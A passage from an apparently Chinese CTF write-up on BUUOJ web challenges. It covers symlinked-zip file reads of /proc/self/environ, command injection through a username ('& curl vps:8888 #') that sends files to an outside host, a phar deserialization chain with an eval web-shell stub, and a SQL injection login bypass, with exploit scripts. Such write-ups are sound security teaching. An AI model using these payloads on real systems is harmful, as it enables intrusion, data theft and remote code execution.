!&#x3D; -1 or cmd.find(&#39;;&#39;) !&#x3D; -1:</span><br><span class="line">        waf()</span><br><span class="line">        return &#39;error&#39;</span><br><span class="line">    os.system(cmd)</span><br><span class="line">......</span><br><span class="line">image &#x3D; open(path+unzip_filename, &quot;rb&quot;).read()</span><br><span class="line">resp &#x3D; make_response(image)</span><br><span class="line">resp.headers[&#39;Content-Type&#39;] &#x3D; &#39;image&#x2F;png&#39;</span><br><span class="line">return resp</span><br></pre></td></tr></table></figure><p>这里的功能就是客户端上传一个压缩后的图片，服务端会解压缩后并读取图片返回客户端。但是我们可以上传一个软链接压缩包，来读取其他敏感文件而不是我们上传的文件。同时结合 showflag()函数的源码，我们可以得知 flag.jpg 放在 flask 应用根目录的 flag 目录下。那么我们只要创建一个到<code>/xxx/flask/flag/flag.jpg</code>的软链接，即可读取 flag.jpg 文件。</p><p>这里有两种方式</p><p><strong>0x00：</strong><br>在 linux 中，<code>/proc/self/cwd/</code>会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用<code>/proc/self/cwd/flag/flag.jpg</code>来访问 flag.jpg</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag&#x2F;flag.jpg qwe</span><br><span class="line">zip -ry qwe.zip qwe</span><br></pre></td></tr></table></figure><p><strong>0x01：</strong><br>在 linux 中，<code>/proc/self/environ</code>文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到<code>/proc/self/environ</code>的内容，只需要下载到本地，用 notepad++打开即可)</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;proc&#x2F;self&#x2F;environ qqq</span><br><span class="line">zip -ry qqq.zip qqq</span><br><span class="line">ln -s &#x2F;ctf&#x2F;hgfjakshgfuasguiasguiaaui&#x2F;myflask&#x2F;flag&#x2F;flag.jpg www</span><br><span class="line">zip -ry [www.zip](http:&#x2F;&#x2F;www.zip) www</span><br></pre></td></tr></table></figure><p>最终exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;3917cde6-876c-43a8-ae7a-d9351fd1f1ec.node3.buuoj.cn&#x2F;upload&quot;</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &#39;cookie&#39;:&#39;session&#x3D;eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y-3TE&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    files &#x3D; &#123;&#39;file&#39;:open(&#39;E:&#x2F;&#x2F;qwe.zip&#39;,&#39;rb&#39;)&#125;</span><br><span class="line">    data&#x3D;&#123;</span><br><span class="line">        &#39;submit&#39;:&#39;Submit&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,data&#x3D;data,headers&#x3D;headers)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><ul><li>非预期解法</li></ul><p>题目中存在命令执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f&#x3D;request.files[&#39;file&#39;]</span><br><span class="line">path &#x3D; basepath+&#39;&#x2F;upload&#x2F;&#39;+md5_ip+&#39;&#x2F;&#39;+md5_one+&#39;&#x2F;&#39;+session[&#39;username&#39;]+&quot;&#x2F;&quot;</span><br><span class="line">filename &#x3D; f.filename</span><br><span class="line">pathname &#x3D; path+filename</span><br><span class="line">try:</span><br><span class="line">cmd &#x3D; &quot;unzip -n -d &quot;+path+&quot; &quot;+ pathname</span><br><span class="line">if cmd.find(&#39;|&#39;) !&#x3D; -1 or cmd.find(&#39;;&#39;) !&#x3D; -1:</span><br><span class="line">waf()</span><br><span class="line">return &#39;error&#39;</span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><p><code>filename</code>和<code>session[&#39;username&#39;]</code>我们都是可控的，然后参数之间拼接到命令。只是过滤了<code>|</code>和<code>;</code>，但是<code>&amp;</code>和<code>#</code>都没有过滤掉，所以可以构造任意命令执行</p><p>可控的两个参数中，<code>filename</code>因为是文件名，不能带有<code>/</code>，所以不好注入</p><p>于是就把注入点放在<code>session[&#39;username&#39;]</code></p><p>注册用户名：<code>&amp; curl vps:8888 #</code>，得到session后，同样按上面的方法一样修改<code>id:1</code>然后访问<code>/upload</code></p><p>利用-d 参数将jpg文件信息带出来，参考：<a href="https://nikoeurus.github.io/2019/12/09/SWPU-ctf/#easy-python" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/12/09/SWPU-ctf/#easy-python</a></p><p>贴一下官方wp地址：<a href="https://www.anquanke.com/post/id/194640" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194640</a></p><h3 id="0x-06-SWPUCTF-2018-SimplePHP"><a href="#0x-06-SWPUCTF-2018-SimplePHP" class="headerlink" title="0x 06 [SWPUCTF 2018]SimplePHP"></a>0x 06 [SWPUCTF 2018]SimplePHP</h3><ul><li><p>考点</p><p>phar反序列化</p></li><li><p>解题过程</p></li></ul><ol><li>页面有两个功能，读取文件和上传文件，利用读取文件读取源代码，如下</li></ol><p>file.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  </span><br><span class="line">include &#39;function.php&#39;; </span><br><span class="line">include &#39;class.php&#39;; </span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; </span><br><span class="line">if(empty($file)) &#123; </span><br><span class="line">    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$show &#x3D; new Show(); </span><br><span class="line">if(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source &#x3D; $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; else if (!empty($file))&#123; </span><br><span class="line">    die(&#39;file doesn\&#39;t exists.&#39;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str &#x3D; $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test &#x3D; $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key &#x3D; $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#39;hacker!&#39;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params &#x3D; array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value &#x3D; $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text &#x3D; base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>pop链构造如下：</p><blockquote><p>1.利用C1e4r类的<code>__destruct()</code>中的<code>echo $this-&gt;test</code><br> 2.触发Show类的<code>__toString()</code><br> 3.利用Show类的<code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source</code><br> 4.触发Test类的<code>__get()</code><br> 5.成功利用<code>file_get()</code>读文件</p></blockquote><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r&#123;</span><br><span class="line">public $test;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new Test();</span><br><span class="line">$a-&gt;params[&#39;source&#39;] &#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;</span><br><span class="line"></span><br><span class="line">$b &#x3D; new Show();</span><br><span class="line">$b-&gt;str[&#39;str&#39;]&#x3D;$a;</span><br><span class="line"></span><br><span class="line">$c &#x3D; new C1e4r();</span><br><span class="line">$c-&gt;str &#x3D; $b;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&#39;phar.phar&#39;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php echo 1;eval($_GET[&quot;Smi1e&quot;]);?&gt;&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);</span><br><span class="line">$phar -&gt; setMetadata($c); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">$phar -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);&#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar -&gt; stopBuffering();   &#x2F;&#x2F;签名自动计算</span><br></pre></td></tr></table></figure><p>将生成的phar修改后缀为jpg后上传，计算上传后的路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename &#x3D; md5(&quot;phar.jpg&quot;.&quot;174.0.222.75&quot;).&quot;.jpg&quot;;</span><br><span class="line">echo $filename;</span><br></pre></td></tr></table></figure><p>访问：<code>http://15ad6660-d710-4885-80f1-1341ad6588b6.node3.buuoj.cn/file.php?file=phar:///var/www/html/upload/e961ead23ad245f8859475af4eb77a87.jpg</code>得到base64编码的flag</p><p>参考链接：<a href="https://xz.aliyun.com/t/3656#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-14</a></p><h3 id="0x-07-SWPU2019-Web6"><a href="#0x-07-SWPU2019-Web6" class="headerlink" title="0x 07 [SWPU2019]Web6"></a>0x 07 [SWPU2019]Web6</h3><ul><li><p>考点</p><p>SQL注入、session.upload_progress的利用</p></li><li><p>解题过程</p></li></ul><ol><li>首页是登录页面，经过测试发现账号密码分开验证，且没有验证账号密码是否不为空，猜测后台代码逻辑为</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select * from users where username&#x3D;&#39;$name&#39; and passwd&#x3D;&#39;$pass&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; </span><br><span class="line">    $key &#x3D; mysql_fetch_array($query);</span><br><span class="line">    if($key[&#39;passwd&#39;] &#x3D;&#x3D; $_POST[&#39;passwd&#39;]) &#123;</span><br></pre></td></tr></table></figure><p>这里需要绕过<code>if($key[&#39;passwd&#39;] == $_POST[&#39;passwd&#39;])</code>，使用如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1&#39; or &#39;1&#39;&#x3D;&#39;1&#39; group by passwd with rollup having passwd is NULL #</span><br><span class="line">密码为空</span><br></pre></td></tr></table></figure><p>这儿with rollup会增加一行，其中passwd为NULL，having passwd is NULL 表示选择我们增加的那一行，即有用户名，密码为空，所以我们登陆时密码为空即可。本地验证如下：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323195335336.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323200804839.png" alt></p><ol start="2"><li>扫一下目录发现一个<code>wsdl.php</code>,<code>f12</code>可以查看里面的内容</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">include (&quot;encode.php&quot;);</span><br><span class="line">include(&quot;Service.php&quot;);</span><br><span class="line">&#x2F;&#x2F;error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;phpinfo();</span><br><span class="line">$method &#x3D; $_GET[&#39;method&#39;]?$_GET[&#39;method&#39;]:&#39;index&#39;;</span><br><span class="line">&#x2F;&#x2F;echo 1231;</span><br><span class="line">$allow_method &#x3D; array(&quot;File_read&quot;,&quot;login&quot;,&quot;index&quot;,&quot;hint&quot;,&quot;user&quot;,&quot;get_flag&quot;);</span><br><span class="line">if(!in_array($method,$allow_method))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;not allow method&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($method&#x3D;&#x3D;&#x3D;&quot;File_read&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    $param &#x3D;$_POST[&#39;filename&#39;];</span><br><span class="line">    $param2&#x3D;null;</span><br><span class="line"></span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">    if($method&#x3D;&#x3D;&#x3D;&quot;login&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        $param&#x3D;$_POST[&#39;username&#39;];</span><br><span class="line">        $param2 &#x3D; $_POST[&#39;passwd&#39;];</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;method can use&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $method;</span><br><span class="line">$newclass &#x3D; new Service();</span><br><span class="line">echo $newclass-&gt;$method($param,$param2);</span><br><span class="line">ob_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>encode.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function en_crypt($content,$key)&#123;</span><br><span class="line">    $key    &#x3D;    md5($key);</span><br><span class="line">    $h      &#x3D;    0;</span><br><span class="line">    $length    &#x3D;    strlen($content);</span><br><span class="line">    $swpuctf      &#x3D;    strlen($key);</span><br><span class="line">    $varch   &#x3D;    &#39;&#39;;</span><br><span class="line">    for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($h &#x3D;&#x3D; $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .&#x3D; $key&#123;$h&#125;;</span><br><span class="line">        </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  &#x3D;  &#39;&#39;;    </span><br><span class="line">    for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .&#x3D; chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($swpu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密cookie：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function decrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $key &#x3D; md5($key);</span><br><span class="line">    $x &#x3D; 0;</span><br><span class="line">    $data &#x3D; base64_decode($data);</span><br><span class="line">    $len &#x3D; strlen($data);</span><br><span class="line">    $l &#x3D; strlen($key);</span><br><span class="line">    $char &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $len; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($x &#x3D;&#x3D; $l)</span><br><span class="line">        &#123;</span><br><span class="line">            $x &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .&#x3D; substr($key, $x, 1);</span><br><span class="line">        $x++;</span><br><span class="line">    &#125;</span><br><span class="line">    $str &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $len; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1)))</span><br><span class="line">        &#123;</span><br><span class="line">            $str .&#x3D; chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $str .&#x3D; chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $str;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>se.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line"></span><br><span class="line">class aa</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($name,$param)</span><br><span class="line">        &#123;</span><br><span class="line">            if($this-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 &#x3D; $this-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __get($ke)</span><br><span class="line">        &#123;</span><br><span class="line">            return $this-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class bb</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class cc</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public $mod3;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 &#x3D; $this-&gt;mod3.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dd</span><br><span class="line">&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        public $flag;</span><br><span class="line">        public $b;</span><br><span class="line">        </span><br><span class="line">        public function getflag()</span><br><span class="line">        &#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a &#x3D; array(reset($_SESSION),$this-&gt;flag);</span><br><span class="line">                echo call_user_func($this-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ee</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                